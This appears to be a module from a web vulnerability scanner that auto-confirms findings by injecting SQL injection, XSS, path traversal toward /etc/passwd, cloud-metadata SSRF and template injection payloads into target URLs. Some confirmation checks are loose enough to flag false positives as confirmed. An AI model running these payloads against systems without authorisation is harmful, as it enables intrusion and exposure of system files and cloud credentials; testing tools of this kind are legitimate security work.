#  MODULE 12 — SAFE EXPLOIT ENGINE
#  Safe exploitation · Evidence collection · Proof of concept · Non-destructive
# ════════════════════════════════════════════════════════════════════════

class SafeExploitEngine:
    SAFE_EXPLOIT_STRATEGIES = {
        "sqli": {
            "payloads": [
                "' AND '1'='1", "' AND '1'='2",
                "1 UNION SELECT NULL--", "' OR 1=1--",
            ],
            "confirm_method": "boolean_diff",
            "risk": "none",
        },
        "xss": {
            "payloads": [
                '<img src=x onerror="void(0)">', '"><svg onload="void(0)">',
                "'-void(0)-'", "<details open ontoggle=void(0)>",
            ],
            "confirm_method": "reflection_check",
            "risk": "none",
        },
        "path_traversal": {
            "payloads": [
                "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
                "..%252f..%252fetc%252fpasswd",
            ],
            "confirm_method": "content_check",
            "risk": "read-only",
        },
        "ssrf": {
            "payloads": [
                "http://169.254.169.254/latest/meta-data/",
                "http://[::ffff:169.254.169.254]/",
            ],
            "confirm_method": "response_check",
            "risk": "read-only",
        },
        "ssti": {
            "payloads": ["{{7*7}}", "${7*7}", "<%=7*7%>"],
            "confirm_method": "math_check",
            "risk": "none",
        },
    }

    def __init__(self, client):
        self._client = client

    async def scan(self, target: str, existing_findings: list) -> list:
        results = []
        exploitable = [f for f in existing_findings if f.severity in ("CRITICAL", "HIGH") and f.url]
        for finding in exploitable[:20]:
            exploit_result = await self._safe_exploit(finding, target)
            if exploit_result:
                results.append(exploit_result)
        return results

    async def _safe_exploit(self, finding: Finding, target: str):
        category = self._classify_finding(finding)
        strategy = self.SAFE_EXPLOIT_STRATEGIES.get(category)
        if not strategy:
            return None
        for payload in strategy["payloads"]:
            try:
                if finding.param:
                    test_url = self._inject(finding.url, finding.param, payload)
                else:
                    test_url = finding.url + ("?" if "?" not in finding.url else "&") + f"test={quote(payload)}"
                resp = await self._client.request("GET", test_url)
                if resp:
                    body = resp.text if hasattr(resp, "text") else str(resp)
                    status = resp.status if hasattr(resp, "status") else 0
                    confirmed = self._check_confirmation(body, status, payload, strategy["confirm_method"])
                    if confirmed:
                        return Finding(
                            plugin="SafeExploitEngine",
                            title=f"CONFIRMED: {finding.title}",
                            severity=finding.severity,
                            description=f"Safe exploitation confirmed: {finding.description}",
                            confidence=95.0,
                            url=test_url,
                            param=finding.param,
                            payload=payload,
                            evidence=f"Confirmation method: {strategy['confirm_method']}",
                            poc=f"curl -s '{test_url}'",
                            cwe=finding.cwe,
                            tags=["safe-exploit", "confirmed", category],
                        )
            except Exception:
                continue
        return None

    def _classify_finding(self, finding: Finding) -> str:
        text = f"{finding.title} {finding.plugin} {' '.join(finding.tags)}".lower()
        categories = {
            "sqli": ["sqli", "sql", "injection", "database"],
            "xss": ["xss", "cross-site", "script", "reflected"],
            "path_traversal": ["traversal", "path", "lfi", "directory"],
            "ssrf": ["ssrf", "server-side", "request forgery"],
            "ssti": ["ssti", "template", "injection"],
        }
        for cat, keywords in categories.items():
            if any(kw in text for kw in keywords):
                return cat
        return ""

    def _inject(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        params[param] = [payload]
        return urlunparse(parsed._replace(query=urlencode(params, doseq=True)))

    def _check_confirmation(self, body: str, status: int, payload: str, method: str) -> bool:
        if method == "boolean_diff":
            return status == 200 and len(body) > 100
        elif method == "reflection_check":
            safe_payload = payload.replace('"', '').replace("'", "")
            return safe_payload in body or payload in body
        elif method == "content_check":
            return any(ind in body for ind in ["root:", "[boot loader]", "[extensions]"])
        elif method == "math_check":
            return "49" in body
        elif method == "response_check":
            return any(ind in body.lower() for ind in ["ami-id", "instance-id", "meta-data"])
        return False


